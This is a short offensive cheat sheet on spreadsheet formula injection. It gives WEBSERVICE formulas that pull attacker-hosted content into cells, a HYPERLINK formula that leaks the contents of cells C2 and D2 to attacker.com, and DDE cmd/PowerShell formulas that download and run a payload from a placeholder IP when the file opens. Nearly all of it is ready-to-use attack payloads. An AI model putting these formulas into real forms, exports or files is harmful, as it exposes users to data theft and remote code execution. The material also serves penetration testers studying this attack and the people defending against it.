Useful Links
---------------------------------------------
https://www.notsosecure.com/data-exfiltration-formula-injection/

Use Webservice Formula to Inject fake data into Speadsheet
----------------------------------------------------------
In cell "A1" enter the following - Could be "First Name" in web form
=WEBSERVICE("http://www.attacker.com")

Run attacking server
php -S www.attacker.com:80

On attacking server create "index.html" with content you want to change the "fake data" too.
```
############ Begin index.html ##################################
Fake Data
############ End index.html ####################################
```
To fill in multiple cells use multiple html file

=WEBSERVICE("http://www.attacker.com/al.html")
############ Begin a1.html ##################################
Fake
############ End a1.html ####################################

=WEBSERVICE("http://www.attacker.com/a2.html")
############ Begin a2.html ##################################
Data
############ End a2.html ####################################


Use Hyperlink formula to send data to attacking server
------------------------------------------------------
# This will send the data from cells "C2" and "D2" to the attackers server using the GET method. 
=HYPERLINK("http://www.attacker.com?leak="&C2&D2,"Please click for further information")


Execute content when the spreadsheet loads
------------------------------------------------
# Works with any payload, will open associated extension or run exe, bat, etc....
=cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/index.jpeg;Start-Process index.jpeg'!A0
=cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/ps.bat;Start-Process ps.bat'!A0
